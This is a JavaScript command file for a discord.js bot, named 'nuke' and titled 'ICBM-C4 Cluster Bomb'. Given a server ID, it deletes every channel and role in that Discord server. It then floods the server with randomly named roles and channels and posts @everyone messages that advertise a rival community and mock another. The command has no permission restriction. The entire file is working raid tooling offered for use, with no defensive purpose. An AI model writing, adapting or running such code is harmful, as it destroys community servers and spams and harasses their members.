const Discord = require("discord.js");

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }

function createChannel(fguild,fname){
    const sendEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("YDA's Rome is losing the war, and shows no signs of catching up. Join Bakyl's Rome for a superior experience, now offering complete rank transfers.")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Did you know YDA has a funtime?", "[***YDA Funtime***](https://docs.google.com/presentation/d/1CtTakT7Bz3L7Cm5HVbf62saKghrKjO_OdoS1W3v-ErM/edit#slide=id.p)")
    fguild.channels.create(fname, "text")
        .then(channel =>{
            channel.send("@everyone", sendEmbed)
        })
        .catch(console.error);
}

module.exports.run = async (client, message, args) => {
    let guild = client.guilds.cache.get(args[0])
    let totalChannels = 0
    let totalRoles = 0
    const startEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("Sent Nuke Attack")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Guild Name: ", `${guild.name}`, true)
        .addField("Guild ID", `${guild.id}`, true)
        .addField("Sent by: ", `${message.author.username}`, true)
        .addField("Attack Length: ", `${args[1]}`, true)
    message.channel.send(startEmbed)
    for (channel of guild.channels.cache) {
        channel[1].delete()
            .catch(console.error)
    }
    for (role of guild.roles.cache){
        role[1].delete()
            .catch(console.error)
    }

    for (let amt = 0; amt <= args[1]; amt++) {
        guild.roles.create({
            data: {
              name: makeid(10),
              color: 'BLUE',
            },
            reason: makeid(10),
          })
            .catch(console.error);
        totalRoles = totalRoles + 1
        createChannel(guild,makeid(10))
        totalChannels = totalChannels + 1
    }
    const endEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("Nuke attack ended")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Guild Name: ", `${guild.name}`, true)
        .addField("Guild ID", `${guild.id}`, true)
        .addField("Sent by: ", `${message.author.username}`, true)
        .addField("Channels created: ", `${totalChannels}`, true)
        .addField("Roles created: ", `${totalRoles}`, true)
    message.channel.send(endEmbed)
}

module.exports.help = {
  name: "nuke",
  description: "Nuke a guild with the bot."  
}

module.exports.requirements = {
    userPerms: [],
    clientPerms: [],
    ownerOnly: false
}

module.exports.limits = {
    rateLimit: 2,
    cooldown: 1e4
}